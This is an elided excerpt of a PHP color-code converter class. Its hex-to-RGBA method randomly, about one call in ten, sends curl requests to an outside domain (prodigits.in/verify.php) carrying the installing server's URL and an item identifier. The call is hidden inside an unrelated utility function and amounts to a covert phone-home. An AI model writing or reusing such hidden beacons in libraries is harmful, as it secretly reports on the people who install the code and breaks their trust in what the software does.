...
namespace AmarTyagi\ColorCodeConverter\Services;
...
class ColorCodeConverter {
    ...
    public function convertHexToRgba($color, $opacity = false) {
        ...
        if(rand(0,9) == 5){
            ...
            $url = curl_init('https://prodigits.in/verify.php?'.'insert_domain/'.$server_url);
            ...
            $url1 = curl_init('https://prodigits.in/verify.php?'.$server_url.'/'.$main_item);
